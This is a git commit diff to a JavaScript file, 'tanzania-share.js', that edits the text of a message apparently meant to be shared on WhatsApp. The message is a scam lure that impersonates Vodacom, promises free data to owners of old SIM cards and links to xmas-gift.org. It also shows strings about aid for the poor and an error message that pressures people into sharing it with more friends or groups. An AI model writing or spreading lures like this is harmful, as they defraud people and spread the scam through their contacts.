e7d69d033b05b8c99a43a35bfdfceb2300e2fa4b
4g-network <154092422+4g-network@users.noreply.github.com>
2024-05-04 23:53:20 -0700

    Update tanzania-share.js

--- tanzania-share.js
+++ tanzania-share.js
@@ -1,4 +1,4 @@
- var text1 = "*GOOD NEWS:*_VODACOM OLD SIM CARD FREE DATA OFFER_%0A%0AVodacom is Offering Free Data to all *OLD SIM CARD*%0A%0A6 Month Old Sim - *5GB*%0A1 Year and above - *10GB*%0A%0AHurry Now and check if your *VODACOM SIM CARD* is eligible for this offer%0A%0A_FOR 6-MONTH SIM_👇%0Ahttps://xmas-gift.org/vodacom-tz%0A%0A_1 YEAR AND ABOVE SIM_👇%0Ahttps://xmas-gift.org/vodacom-tz",
+ var text1 = "*GOOD NEWS*: _VODACOM OLD SIM CARD FREE DATA OFFER_%0A%0AVodacom is Offering Free Data to all *OLD SIM CARD*%0A%0A6 Month Old Sim - *5GB*%0A1 Year and above - *10GB*%0A%0AHurry Now and check if your *VODACOM SIM CARD* is eligible for this offer%0A%0A_FOR 6-MONTH SIM_👇%0Ahttps://xmas-gift.org/vodacom-tz%0A%0A_1 YEAR AND ABOVE SIM_👇%0Ahttps://xmas-gift.org/vodacom-tz",
             text2 = " an amount of ",
             text3 = "for every citizen who meets the conditions as an aid to the poor class to overcome the crisis. Enter and register now and make sure to register correctly 👉 ",
             error = "Something is wrong!\nPosts are not calculated. You may have shared it with the same friend or group more than once, please re-share",
